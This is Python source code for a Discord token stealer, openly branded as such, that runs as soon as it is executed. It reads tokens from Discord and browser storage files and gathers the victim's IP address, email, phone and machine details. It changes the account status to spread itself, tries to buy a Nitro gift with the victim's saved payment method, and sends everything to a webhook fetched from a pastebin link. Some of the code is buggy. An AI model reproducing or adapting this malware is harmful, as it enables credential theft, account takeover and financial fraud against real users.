for _ in range(2):
    try:
        import re, requests, json
    except:
        import os
        os.system('pip install requests >nul')

import os, re, requests, json
class ST34L3R():
    def __init__(self, hook, status):
        self.WEBHOOK = hook
        self.NEW_STATUS = status
        
    def gettokens(self):
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord"               : ROAMING + "\\Discord",
            "Discord Canary"        : ROAMING + "\\discordcanary",
            "Discord PTB"           : ROAMING + "\\discordptb",
            "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
            "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : ROAMING + "\\Lightcord",
            'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : LOCAL + "\\Amigo\\User Data",
            'Torch'                 : LOCAL + "\\Torch\\User Data",
            'Kometa'                : LOCAL + "\\Kometa\\User Data",
            'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
            'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
            '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
            'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
            'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
            'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld"
        }
        
        for platform, path in PATHS.items():
            path += "\\Local Storage\\leveldb"
            tokens = []
            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)
                return tokens

    def getip(self):
        try:
            return requests.get("https://api.ipify.org").text
        except:
            return

    def spread(self, token, status):
        try:
            return requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"content-type": "application/json", "authorization": token}, json={"custom_status":{"text":status}})
        except:
            return
    
    def getuserinfo(self, token):
        try:
            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
        except:
            return None
    
    def buy_nitro(token):
        try:
            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
            if r.status_code == 200:
                payment_source_id = r.json()[0]['id']
                if '"invalid": ture' in r.text:
                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
                    return r.json()['gift_code']
        except:
            return "None"
        
    def main(self):
        embeds = []
        for token in self.gettokens():
            try:
                ip = self.getip()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                get_infos = self.getuserinfo(token)
                
                username = get_infos["username"]
                user_id = get_infos["id"]
                user_avatar = get_infos["avatar"]
                try:
                    user_banner = get_infos["banner"]
                except:
                    user_banner = None
                
                email = get_infos["email"]
                phone = get_infos["phone"]
                local = get_infos["locale"]
                bio = get_infos["bio"]
                
                try:
                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:
                        nitro_type = "Nitro Classic"
                    
                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:
                        nitro_type = "Nitro Boost"
                    
                    else:
                        nitro_type = "No Nitro"
                except:
                    nitro_type = "No Nitro"
            
                embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "**__User Infos:__**",
                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n\n- __New Status:__ `{self.NEW_STATUS}`"
                        },
                        {
                            "name": "**__PC Infos:__**",
                            "value": f"- __PC Name:__ `{pc_name}`\n- __PC Username:__ `{pc_username}`\n- __IP Adress:__ `{ip}`"
                        },
                        {
                            "name": "__**About:**__",
                            "value": f"```{bio}```"
                        },
                        {
                            "name": "__**Token:**__",
                            "value": f"```\n{token}\n```"
                        },
                        {
                            "name": "__**Nitro Buy:**__",
                            "value": f"https://discord.gift/" + self.buy_nitro()
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                    },
                    "footer": {
                        "text": f"P0W3RFULL DISC0RD T0K3N ST34L3R  -  discord.gg/devfr",
                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                    },
                    "image": {
                        "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
                    },
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}?size=1024"
                    }
                }
                embeds.append(embed)
                self.spread(token)
            
            except Exception as e:
                pass # print(e)
        
        payload = {
            "content": "",
            "embeds": embeds,
            "username": "P0W3RFULL T0K3N ST34L3R",
            "avatar_url": "https://cdn.discordapp.com/attachments/893976653208891404/901794780068081684/stan.gif"
        }
        requests.post(self.WEBHOOK, headers={"content-type": "application/json"}, data=json.dumps(payload).encode())

ST34L3R = ST34L3R(
    requests.get("https://pastebin.com/raw/XXXXXXXX").text,
    "Stealed by discord.gg/devfr"
)
ST34L3R.main()
